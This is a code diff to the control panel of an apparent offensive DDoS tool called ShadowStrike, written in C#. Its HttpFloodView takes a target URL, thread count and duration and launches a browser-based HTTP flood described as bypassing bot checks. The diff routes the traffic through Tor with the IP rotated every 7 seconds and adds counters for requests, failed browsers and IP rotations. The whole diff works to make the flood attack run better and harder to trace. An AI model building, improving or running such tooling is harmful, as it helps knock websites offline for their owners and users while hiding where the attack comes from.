@@ -16,15 +16,12 @@ namespace ShadowStrike.UI.Views
         private CancellationTokenSource? _cts;
         private DispatcherTimer _timer;
         private bool _isAttacking = false;
-        // private int _torPort = 9050; // REMOVED - Using Global TorManager
-        private System.Net.CookieContainer _bypassedCookies;
-        private string _bypassedUserAgent;
 
         public HttpFloodView()
         {
             InitializeComponent();
             _timer = new DispatcherTimer();
-            _timer.Interval = TimeSpan.FromMilliseconds(100);
+            _timer.Interval = TimeSpan.FromMilliseconds(200);
             _timer.Tick += Timer_Tick;
 
             // Auto-fill from AppState
@@ -34,26 +31,40 @@ namespace ShadowStrike.UI.Views
                 TargetInput.Text = appState.TargetUrl;
             }
 
-            // Check Tor connectivity - REMOVED (Handled Globally by MainWindow)
             this.Loaded += (s, e) =>
             {
+                // Reload target URL
                 var state = AppState.Load();
                 if (!string.IsNullOrEmpty(state.TargetUrl))
                 {
                     TargetInput.Text = state.TargetUrl;
+                }
+
+                // Reflect actual Tor state (global protection was initialized in MainWindow)
+                if (TorManager.IsRunning)
+                {
+                    TorStatusText.Text = $"Tor: Active ✓  (Port {TorManager.TorPort} · Auto-rotation 7s)";
+                    TorStatusText.Foreground = new SolidColorBrush(Color.FromRgb(0, 255, 136));
+                }
+                else
+                {
+                    TorStatusText.Text = "Tor: Not Available — requests use direct IP";
+                    TorStatusText.Foreground = new SolidColorBrush(Color.FromRgb(255, 100, 100));
                 }
             };
         }
 
         private void Timer_Tick(object? sender, EventArgs e)
         {
+            // Requests sent — from BrowserFlooder JS counter
             RequestsText.Text = _browserFlooder.RequestCount.ToString("N0");
-            FailedText.Text = "0"; 
-        }
 
-        // AttackModeCombo_SelectionChanged Removed
-        
-        // BypassBtn_Click Removed
+            // Failed browsers — real count, no longer hardcoded to 0
+            FailedText.Text = _browserFlooder.FailedCount.ToString("N0");
+
+            // IP Rotations — how many Tor NEWNYM signals succeeded this session
+            RotationsText.Text = TorManager.RotationCount.ToString("N0");
+        }
 
         private async void AttackBtn_Click(object sender, RoutedEventArgs e)
         {
@@ -64,11 +75,14 @@ namespace ShadowStrike.UI.Views
                 _flooder.Stop();
                 _browserFlooder.Stop();
                 _timer.Stop();
-                
+
+                // Freeze final counts
+                Timer_Tick(null, EventArgs.Empty);
+
                 AttackBtn.Content = "LAUNCH ATTACK";
-                AttackBtn.Background = (Brush)FindResource("PrimaryHueMidBrush"); // Restore original color
+                AttackBtn.Background = (Brush)FindResource("PrimaryHueMidBrush");
                 StatusText.Text = "STOPPED";
-                StatusText.Foreground = Brushes.Orange;
+                StatusText.Foreground = new SolidColorBrush(Color.FromRgb(255, 170, 0));
                 _isAttacking = false;
             }
             else
@@ -80,7 +94,6 @@ namespace ShadowStrike.UI.Views
                     return;
                 }
 
-                // Start Attack
                 var target = TargetInput.Text;
                 if (string.IsNullOrWhiteSpace(target))
                 {
@@ -96,37 +109,43 @@ namespace ShadowStrike.UI.Views
 
                 int threads = (int)ThreadSlider.Value;
                 int duration = (int)DurationSlider.Value;
-                
+
                 _cts = new CancellationTokenSource();
-                
                 if (duration > 0)
                 {
                     _cts.CancelAfter(TimeSpan.FromSeconds(duration));
                 }
 
                 _timer.Start();
-                
-                AttackBtn.Content = "STOP ATTACK";
-                AttackBtn.Background = Brushes.Red;
-                StatusText.Text = "ATTACKING";
-                StatusText.Foreground = Brushes.Red;
-                _isAttacking = true;
 
+                AttackBtn.Content = "STOP ATTACK";
+                AttackBtn.Background = new SolidColorBrush(Color.FromRgb(200, 30, 30));
+                StatusText.Text = "ATTACKING";
+                StatusText.Foreground = new SolidColorBrush(Color.FromRgb(255, 60, 60));
+                _isAttacking = true;
 
                 try
                 {
-                    // ALWAYS use Browser Flood (Bypass Mode)
-                    // ALWAYS use Integrated Tor (User Request)
-                    bool useExternalTor = false; 
-                    
-                    await _browserFlooder.StartAttackAsync(target, threads, _cts.Token, useExternalTor);
+                    // Always use Browser Flood — Tor routing handled globally by TorManager
+                    await _browserFlooder.StartAttackAsync(target, threads, _cts.Token, useExternalTor: false);
+                }
+                catch (OperationCanceledException)
+                {
+                    // Normal duration-based stop — not an error
                 }
                 catch (Exception ex)
                 {
                     CustomMessageBox.Show($"Attack Error: {ex.Message}", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
+                }
+                finally
+                {
                     _isAttacking = false;
-                    AttackBtn.Content = "LAUNCH ATTACK";
                     _timer.Stop();
+                    Timer_Tick(null, EventArgs.Empty); // Freeze final counts
+                    AttackBtn.Content = "LAUNCH ATTACK";
+                    AttackBtn.Background = (Brush)FindResource("PrimaryHueMidBrush");
+                    StatusText.Text = "STOPPED";
+                    StatusText.Foreground = new SolidColorBrush(Color.FromRgb(255, 170, 0));
                 }
             }
         }
